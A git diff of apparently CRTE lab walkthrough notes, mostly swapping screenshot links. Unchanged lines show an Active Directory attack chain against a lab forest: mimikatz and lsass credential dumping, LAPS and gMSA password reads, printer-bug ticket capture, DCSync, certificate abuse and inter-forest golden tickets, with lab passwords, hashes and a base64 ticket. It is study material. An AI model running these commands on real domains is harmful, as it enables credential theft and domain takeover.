@@ -1,4 +1,4 @@
-<h1 style='color:lightblue'> 00 - Total Machines </h1>
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/48e7bfdd-b69e-4bbd-981e-bdc3d61e0499)<h1 style='color:lightblue'> 00 - Total Machines </h1>
 
 1. [ ] US-MGMT
 2. [ ] US-HELPDESK
@@ -36,7 +36,8 @@ PS> whoami
 PS> ipconfig
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/38d79d17-9580-45ed-b240-2a1ec6900f29)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/171b9389-67a2-4cea-9336-cc07016bb121)
+
 
 #### Bypassing AMSI on STUDVM machine and load PowerView and start enumeration on our machine:
 ```powershell
@@ -51,7 +52,10 @@ PS> Get-NetGPOGroup
 # machineadmins 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2e3ed322-5485-4855-8642-61822a94159c)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e120c84a-0e66-46a1-8073-a0db18029331)
+
+
+
 
 
 #### 2. DisplayName of Group Policy applied on Students OU
@@ -62,7 +66,8 @@ PS> Get-NetGPO -ADSPath 'LDAP://cn={FCE16496-C744-4E46-AC89-2D01D76EAD68},cn=pol
 # StudentPolicies 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/77b2756c-7d1a-4805-add9-9eda05025cf8)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/3e95ab83-a58d-4c35-9782-734b356b67a0)
+
 
 
 #### 3. Name of the forest with which us.techcorp.local has an External trust
@@ -71,7 +76,8 @@ PS> Get-NetDomainTrust -Domain US.TECHCORP.LOCAL
 # eu.local 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/6a397199-6b1f-4c66-a5f6-f94954f983dd)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/86abbfdb-6a60-4b84-8ae7-609f529133e6)
+
 
 
 #### 4. Name of the forest other than us.techcorp.local with which eu.local has a trust
@@ -80,7 +86,8 @@ PS> Get-NetForestTrust -Forest EU.LOCAL
 # euvendor.local
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/cff99a43-40f6-49d1-8486-a0616ab0d42a)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/6a3b1038-2372-4cc3-87be-3cb172521c84)
+
 
 
 
@@ -96,7 +103,8 @@ PS> Invoke-AllChecks
 # ALG
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/7b1c579d-7704-4fa7-8e5f-257e3084b70c)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/183e5f76-00a8-4ed7-a533-a382768f31c7)
+
 
 
 2. We can abuse service permissions by adding our selves as the local admin
@@ -104,7 +112,8 @@ PS> Invoke-AllChecks
 PS> Invoke-ServiceAbuse -Name 'ALG' -UserName 'us\studentuser131'
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/a704d184-f4ff-40bf-b5bd-e2bebb566036)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d42570c2-b7a9-4d25-a9ba-ce7b5afc5e7e)
+
 
 
 #### BloodHound
@@ -113,7 +122,8 @@ PS> Invoke-ServiceAbuse -Name 'ALG' -UserName 'us\studentuser131'
 PS> C:\AD\Tools\BloodHound-master\Collectors\SharpHound.exe -c All,LoggedOn
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/47126016-c4e3-4062-ae2c-be866a7826fb)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4f00bf73-3c1c-48cf-a73d-5867bfb703d7)
+
 
 <h1 style='color:lightblue'> 02 - US-MGMT.US.TECHCORP.LOCAL </h1>
 
@@ -123,7 +133,8 @@ PS> C:\AD\Tools\BloodHound-master\Collectors\SharpHound.exe -c All,LoggedOn
 + We will be doing an OU delegation from *studentuser131* to get access to *US-MGMT*
 + Opening the BloodHound Report we can see that *studentuser131* has few properties which can be abused to access *US-MGMT* machine
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2250755e-becb-4629-8bee-028cf31946d6)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/17fcf927-bc78-4a9d-8273-db94c5cf7070)
+
 
 #### 6. Name of the group that has GenericAll/FullControl rights on MachineAdmins and has studentusers as members
 ```powershell
@@ -138,7 +149,8 @@ PS> Add-DomainGroupMember -Identity 'MACHINEADMINS' -Members 'studentuser131'
 PS> Get-DomainGroupMember -Identity 'MACHINEADMINS'
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/ef658a3e-c761-4b61-98cb-bdc58a16a300)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1e17dee2-3d14-4a0a-bb38-0aba88c43174)
+
 
 
 2. Now that we are a part of that group we can use `winrs` wo connect to the machine
@@ -146,7 +158,8 @@ PS> Get-DomainGroupMember -Identity 'MACHINEADMINS'
 PS> winrs -remote:US-MGMT -u:us\studentuser131 -p:'aSLxbA8Kr76BHrwG' cmd.exe
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/68d2cb77-462c-4507-98fc-eaa22ba58e96)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9c45660b-b712-4a34-a2a5-7fe89ab7fb3d)
+
 
 3. Now that we have access to *us-mgmt*, we can execute mimikatz and dump the hashes
 ```powershell
@@ -172,7 +185,8 @@ PS> # administrators
 #### 8. SevicePrincipalName of the user serviceaccount that we Kerberoasted
 + We can check it using Bloodhound
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/99584687-bcfb-42e3-a9d4-bbb24eb800d5)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/44e8f7b3-e60b-45de-9a14-3ae4641c60e7)
+
 
 
 ```powershell
@@ -212,7 +226,8 @@ $> john hash --wordlist=/path/to/rockyou.txt
 PS> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/a0b538d7-a5cb-4f74-ab78-5da56ad52da4)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/36e55f5f-fd0b-40e3-99e3-186d2e887faf)
+
 
 2. From the above response we can see that *us-mailmgmt*'s creds can be read in clear text. Using the AD Module we can view the laps permissions for that user and then dump the creds.
 ```powershell
@@ -232,7 +247,8 @@ PS> Get-DomainObject -Identity US-MailMgmt | select -ExpandProperty ms-mcs-admpw
 # password :: LIaOF}u!g7yYE,
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/a2eb2717-d05d-4bde-9f10-f0ae8da1cac0)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/559a1e75-b472-465d-98dd-816e2853bc94)
+
 
 3. Using the creds we can use `winrs` to logon as *US-MAILMGMT*
 ```powershell
@@ -242,7 +258,8 @@ PS> hostname
 PS> ipconfig
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/55f0c086-b3a1-473e-b922-dc8e495a3202)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/886bc991-38ca-485c-9814-a316f93e59c7)
+
 
 ## **Dumping Credentials**
 <hr>
@@ -264,7 +281,8 @@ PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
 # aes256 :: a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2a9f903c-3bff-4a61-bb82-4d4dbeb7ceee)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/dc60eba4-c31a-4ad9-a21c-37b0fabf5750)
+
 
 #### 10. The attribute of a computer object that holds password managed by LAPS in clear-text
 ```powershell
@@ -287,7 +305,8 @@ PS> winrs -r:us-mailmgmt -u:.\administrator -p:t7HoBF+m]ctv.] "bitsadmin /transf
 
 1. Looking at the BloodHound Report provisioningsvc can do GMSA Abuse on jumpone
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c5ff91a0-0a0a-40e3-a8d3-fa4cfc3bf075)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/72573a9f-99bf-4ef8-8e13-a77a25e2dc59)
+
 
 
 2. With the new NTLM hash obtained we can spawn a new PS session. With powerview and admodule we can enumerate the GMSA.
@@ -299,7 +318,8 @@ PS> Invoke-Mimi -Command '"sekurlsa::pth /user:provisioningsvc /domain:US.TECHCO
 PS> Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/f3b8c3ae-6c15-4912-8cb1-df521e59a719)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/896dc1a4-f162-42cb-b2a0-b696bdc7d26b)
+
 
 3. Now that its confirmed we can extract the creds for jumone
 ```powershell
@@ -326,7 +346,8 @@ PS> (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NT
 PS> $cred = new-object system.management.automation.PSCredential "us\jumpone",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/ecf916df-d67f-4c49-b4d3-9e56d2ef59b0)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9c9cc040-aef7-4462-8c64-de10c189a79c)
+
 
 #### 13. Name of the Group Managed Service Account (gMSA)
 ```powershell
@@ -356,7 +377,8 @@ PS> Find-PSRemotingLocalAdminAccess -Verbose
 PS> winrs -r:us-jump cmd
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5345c1eb-2ca8-4e5a-a96b-fb4db34ecd04)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/54e4d20e-9b31-44df-8453-df455af3df0c)
+
 
 ## **Bypassing WDECK**
 <hr>
@@ -374,7 +396,8 @@ PS> tasklist /FI "IMAGENAME eq lsass.exe"
 PS> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 720 C:\Users\Public\Documents\lsass.dmp full
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2c18c442-1b27-499f-bb20-9ef0f8f990bd)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/efe4ceac-54a0-4657-89f7-e8d2665b0a23)
+
 
 + Now we can transfer this file to our studentvm and use mimikatz to dump the creds offline
 ```powershell
@@ -403,11 +426,14 @@ mimikatz > sekurlsa::ekeys
 # aes256 :: 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1f6c2c1a-a25c-495a-9e20-61261180de2d)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/fccbb81e-0ad0-4bf1-895e-d4cac8accc21)
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5182394a-3e63-4a76-977a-3f380518afad)
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/8e1b6dd9-9ec6-47ef-90d7-12d27b842932)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/cb74e3a3-5c16-4e04-a331-d099cfca616d)
+
+
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1fcc0dfe-ca67-4364-bdc5-77affd9c3f2d)
+
 
 ## **Dumping the Certificate Pfx**
 <hr>
@@ -428,7 +454,8 @@ PS> echo F | xcopy \\us-jump\C$\Users\Public\Documents\pawadmin.pfx C:\AD\Tools\
 # We will use this certificate later!
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/aa9758ae-3729-463e-8f73-2c0e7e567b42)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e1670a48-5d96-4175-b337-3c7a0eb2e269)
+
 
 
 #### 15. PowerShell command that we used to check Applocker rules on us-jump
@@ -465,7 +492,7 @@ PS> Find-PSRemotingLocalAdminAccess -Verbose
 PS> winrs -r:us-web cmd
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/a020dd57-6e1b-4685-afc1-43b129687791)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/77f6f74a-47f9-4e87-ab04-d769e792f18c)
 
 
 <h1 style='color:lightblue'> 06 - US-DC.US.TECHCORP.LOCAL </h1>
@@ -478,7 +505,8 @@ PS> winrs -r:us-web cmd
 PS> Get-NetComputer -UnConstrained
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/164b1001-d6a7-470c-96cd-0d995fece8a3)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/f114d83b-bb08-4bcb-8010-4110025da947)
+
 
 
 2. We can use print bug exploit to capture the ticket of the DC. For this we can spawn two sessions as *US-WEB* where `rubeus.exe` will be set as monitor mode and on the other session we can use `MS-RPRN.exe` to force the *DC* to connect to *WEB* and capture the ticket.
@@ -499,7 +527,7 @@ PS> echo F | xcopy C:\AD\Tools\MS-RPRN.exe \\us-web\C$\Windows\Tasks\MS-RPRN.exe
 PS> .\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e31c37b7-31bc-4696-bdc6-8b9ecab94b1e)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4e137460-3f03-42a3-a6fe-e691d04978d4)
 
 
 2. Using *Rubeus* we can inject the ticket into the session
@@ -507,7 +535,8 @@ PS> .\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
 PS> C:\AD\Tools\Rubeus.exe ptt /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMsztl0SQHlPKKeIMUzVBV0BzWFP3qndXcFGoicxBwbI2cbCxooSagHYo0YiCK/lo+vCfhkWkz9mUvrnttymrYp8zKAoSxBFOyPPQU17WFb052KXfnhR+h+iBBeJC+7iG0qNXTge5BYxIgooIUnkAeYfQj+Xx4/JvzbGLDxO/EeZenzT+INfwwFT8xybgxT2JCYgjQor7jQdmJs345vTk3sNL2QZXUodnyUCBYUkRKn7KTwB7r5y9uSJbp+RlPV8Nr63gQiMLiXbAEF8jhyWtHqJOcM+QFDmDf51UYWht1SbAHQMysYEXMqD45wPMD+U0Kr5Bs46kOsbD9Zh6XJSLoRCVDoHCWAhmD5BqXTghpKIKRxdj/tUjbsSZ4wENFA2cLbgSWILYh9pDrpZFg8m3ukBbkRBuVQygtYagKhMzWGw5I1EVyPcIrs/aF1XohUvA9C/YDIqmWAT7v7UG9AAHtOOyUvVXx8IzxQMEtR4aCyrigDo7md4uOqj5lKFqO9DU5f+pPuS37pPRzecpUYLZ3oopikd8Ds9kGcigxalPRLLxZ3lpDZgheTm0Sw5zKDdM4pxj2MyMQRSiBj/4m3eUnueDcYBLl0ntQ4k8NkZcAgUwULf2FtWcMrH95Kpyt0z85CZuGlqYrJJwxzvrCVrv771CX6X3gtMn23n9P+sWLwQ83XRowfw6FoOGMtf077IymwlfpfTFjEf2vDNpfr2ayLQtFuJz1RpNJv7EHFf0qzPlX/2tTVu0Roxu7PPU3ogAlPy4nKONETO/Xe7HYoJsjW1/cBWQBLsiy9UU7nI2kYCT9ONsLLG5hdBZNF9tJwhX0qLw248W0doTxSf/dAjOtwM4+yjMtV2pWbwQBnlFEtjLcS9QLetitolEQT2WQ/tWVH978SQpQdbfiPlF9mZ8mfWjGZGUOdlxPOPALcnJUKLM3HQsBMJLWmtYk+EwdJs63shedWojFKaWzRuotysE51bjzRPmJOk67YwKk3LKXpLxqx0BCUg+Juwnc23BkWR7na6speYIqiEfHfDp9/lkcN/O1ojvwqOiQkXtKUyZVgXhVYRurz2dZCwt8srv98jcRGnCC7S36lnSLU3l00DbTIKgbmyp82Hz1g3PMqmwdfXcyu6BGQ1WzTD4zTgi8+0nZSXOCcqJ2wwER7QBPG0aizcaHakhbHNRti8gFZ4z0/8ScqsCRaOxNFh3CiJQU0hERHKbx/bh3R9DnIF6P1KCQkDSydHJus4t/cGD9i9hQziNluqJ6XC8UvoJq+yjfsSQClicpy9updrIAuk0TioYxPLxvnoLijOoAw0FCoRM5rde5OILX/OrrQxHYUm2fOsmoRG0yBspdFMQ+RVT2LZ6F5Ze5z6P+70i9B3alY3I1N8iETqqfMls6VD5ANXaqeXPkUb7z5gfNSxYx52/sha6XIsqXZMVma59GB9s6b1QRFdzuExXjCLOGNS/eEWejgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDs55e1N7jwf1BLaApMqFY1W3sRrr3VNZsNGHiMWEvk96ETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIzMDcwMTA3MzMzOVqmERgPMjAyMzA3MDExNzMzMzlapxEYDzIwMjMwNzA3MjIwMzE4WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4c84dec9-a700-4438-b848-740295ae5483)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/21de5593-911e-4b34-a21d-3cd8ac127ea1)
+
 
 
 3. Now we can perform a DC-Sync attack and dump the *krgtgt* and *administrator* hash
@@ -529,9 +558,10 @@ PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\administrator --Domain 
 # aes256 :: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/746bff32-0336-49e8-839b-317f676ac193)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d9b591b8-d396-41ce-ab46-513044e6c90c)
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/ea322a37-c0ab-4f70-a167-e4630bb36fb5)
+
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2ab62ab8-dd4f-4800-8634-5dd646f24f48)
 
 
 4. With the administrator hash we can use pth and get a session to *US-DC*
@@ -546,7 +576,7 @@ PS> Find-PSRemotingLocalAdminAccess -Verbose
 PS> winrs -r:us-dc cmd
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/b29dd0d2-b31b-4843-b0ff-25f967c9f846)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/64c574f8-be66-4bd7-a095-0b1639e7c020)
 
 
 5. Now we can dump all the user creds of the DC
@@ -627,7 +657,8 @@ PS> # us-dc
 PS> Certify.exe find
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5fabfdac-583b-4dff-9d6e-4f4ef0505d88)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/a12b989a-0522-43a4-883f-0b14ff23ee99)
+
 
 
 2. From here we can see pawadmin has enrollment right this template. We can try to abuse this by request a TGT for pawadmin and inject in current session.
@@ -643,7 +674,7 @@ Invoke-Mimi -Command '"sekurlsa::pth /user:pawadmin /domain:US.TECHCORP.LOCAL /n
 PS> C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\dump\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/f98b729a-e003-4571-9a49-77c4abdae55f)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5efd9d2e-1fb8-4352-aead-c5773a80778e)
 
 
 3. We can enroll in the template 
@@ -659,7 +690,7 @@ MIIGSTCCBTGgAwIBAgITdwAAAClZ6F4JcDs6QgAAAAAAKTANBgkqhkiG9w0BAQsFADBKMRUwEwYKCZIm
 -----END CERTIFICATE-----
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/52215a1d-86e5-4a53-9233-f2b6eac349a7)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e13f7f73-e087-4df2-a168-ecdb42a0420a)
 
 
 4. Change the RSA into a PFX and Request a TGT with the pfx
@@ -676,7 +707,7 @@ PS> C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\d
 PS> winrs -r:us-dc whoami
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/8f79e2cc-6c1f-4755-bcac-8a1d61e08859)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/12a86f80-310f-4e77-b1f9-ffc74f44fa9c)
 
 
 5. Similarly, we can get Enterprise Admin privileges!
@@ -707,7 +738,8 @@ PS> C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcor
 PS> winrs -r:techcorp-dc cmd
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5a9b06ae-e7b8-4eed-9736-722df3583575)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9970d67b-2d31-4728-b7c6-4fe078aa052f)
+
 
 
 ## **Dumping hashes**
@@ -750,7 +782,8 @@ mimikatz > lsadump::lsa /patch
 | 1136 | USVENDOR$         | f0f9b6844c88501597d8c44ba566b1aa |
 | 1000 | TECHCORP-DC$      | bf873f681eac2a97ec7e625c47dbb9db | 
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/16273ebd-6842-4724-9eef-66bdbd785a0a)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/00555d80-e969-4287-8087-13936c1de07b)
+
 
 
 #### 29.What is the default RID used by Mimikatz (and other tools) for Golden ticket
@@ -796,7 +829,8 @@ PS> # techcorp-dc
 + After dumping hashes from *US-MGMT* we obtained the ntlm hash for *mgmtadmin*
 + On the BloodHound Report we can use RBCD abuse to access *US-HELPDESK*
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/88031d09-ff27-4689-af2c-90b4cd1ec330)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/8bbfca01-7728-4424-a0b0-658e9418fae9)
+
 
 
 ```powershell
@@ -842,9 +876,9 @@ PS [us-helpdesk]: PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
 # aes256 :: f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e9c2eaaa-96ae-4238-93b5-be3359b3cc04)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c37c4870-1a38-4a68-95b9-ff0c342589fe)
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/53095a07-e31d-47e2-9c58-44733c332c8e)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/0b2a8cef-2877-4a81-9d24-cfef068e191b)
 
 
 #### 22. Name of the user that has Write/GenericWrite permissions over the us-helpdesk computer object
@@ -897,7 +931,8 @@ PS> $sess = New-PSSession -Computername US-ADConnect
 PS> Enter-PSSession -Session $sess
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1682e6e3-814a-49c0-95c5-7458508d9a21)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/95ddc657-b437-43b0-aba6-8e09362b5eab)
+
 
 
 2. Load mimikatz into the session and dump the creds
@@ -918,7 +953,8 @@ PS [US-ADConnect]: PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
 # aes256 :: 57d59f785ef201207412119d79b584aaad6da5d32a3e2bb12932c52daefe6ae9 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/dc746bc1-92ce-41dc-be98-80b083c4ac06)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/3ccaab42-6209-4945-aae1-d5711d3c8735)
+
 
 
 
@@ -941,7 +977,8 @@ PS> Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
 # name :: MSOL_16fb75d0227d
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/fe7f7b80-b3a4-4c6b-a6d7-85a7da4e3cc6)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/efbe9bc1-fed2-47a6-88b0-db79c04db5fd)
+
 
 2. We can use adconnect to dump the creds
 ```powershell
@@ -952,7 +989,8 @@ PS> adconnect
 # 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/db18027d-fda9-4730-925f-c68e7fe7848c)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/05a9932c-5dc1-4f4a-b195-de539a0ab276)
+
 
 
 #### 28. Other then us-helpdesk, helpdeskadmin has administrative privileges on which other machine
@@ -993,9 +1031,11 @@ PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
 PS> Invoke-Mimi -Command '"lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local"'
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/dc485f6c-9d1c-4b92-9598-1c624b5d09c3)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/401eb1dc-a8a8-4da4-916b-525f7a1b7449)
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5ef7d2c9-e1bc-413b-84dd-6daa2df18e01)
+
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2123995c-0db7-44a3-9892-41fcab30518d)
+
 
 
 ## **Enumeration**
@@ -1040,7 +1080,8 @@ PS> Invoke-Mimi -Command '"sekurlsa::pth /user:appsvc /domain:US.TECHCORP.LOCAL 
 PS> Get-DomainUser -TrustedToAuth
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5aa48f05-a573-4380-ba13-ec3189a41f1d)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/6b24c35a-c0e9-4dca-8acd-1e7b2a5aa9cc)
+
 
 
 2. Request a TGT for appsvc using its NTLM hash
@@ -1048,7 +1089,8 @@ PS> Get-DomainUser -TrustedToAuth
 PS> .\Rubeus.exe s4u /user:appsvc /rc4:1d49d390ac01d568f0ee9be82bb74d4c /impersonateuser:Administrator /msdsspn:"CIFS/us-mssql.us.techcorp.local" /altservice:HTTP /domain:us.techcorp.local /ptt
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e2b93a80-e089-4bad-b9c9-630b34fb0742)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c997f954-c823-4bee-9e95-c6b3bc23b65a)
+
 
 
 3. Now we can logon to *US-MSSQL* 
@@ -1056,7 +1098,8 @@ PS> .\Rubeus.exe s4u /user:appsvc /rc4:1d49d390ac01d568f0ee9be82bb74d4c /imperso
 PS> winrs -r:us-mssql.us.techcorp.local cmd.exe
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/7bee7614-f669-4551-a003-f1d5566bc8dd)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/3ea6f878-ce94-4d07-a163-ce3422c78be0)
+
 
 
 <h1 style='color:lightblue'> 11 - BASTION-DC.BASTION.LOCAL </h1>
@@ -1086,7 +1129,8 @@ PS> Invoke-Mimi -Command '"lsadump::trust /patch"'
 # aes256 :: 3f7b8bf044a600f3f7a8258d587e56d342f3baa7c27df03a58f3ec9c5a60bd44
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9b4bf5f7-aa55-4a09-9652-940708bafa58)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/0c0d0ce9-a19d-4299-b03e-e487866813ca)
+
 
 
 2. Forge the inter-forest TGT
@@ -1094,7 +1138,8 @@ PS> Invoke-Mimi -Command '"lsadump::trust /patch"'
 PS> Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:techcorp.local /sid:S-1-5-21-2781415573-3701854478-2406986946 /sids:S-1-5-21-284138346-1733301406-1958478260-519 /rc4:052fd8c6017ae73d483552e538b19a59 /service:krbtgt /target:bastion.local /ticket:C:\ad\tools\dump\trust_tkt.kirbi"'
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/41831262-5a37-4e33-83bc-cfc7d6f9cca0)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/49a85e06-6eef-4e2f-b9db-4acfdb3c3754)
+
 
 
 3. Create ticket and add it into the memory using asktgs
@@ -1102,7 +1147,8 @@ PS> Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:techcorp
 PS> .\Rubeus.exe asktgs /ticket:C:\ad\tools\dump\trust_tkt.kirbi /service:cifs/bastion-dc.bastion.local /dc:bastion-dc.bastion.local /ptt
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/65afca3d-0902-44d4-8881-bec283cc46b2)
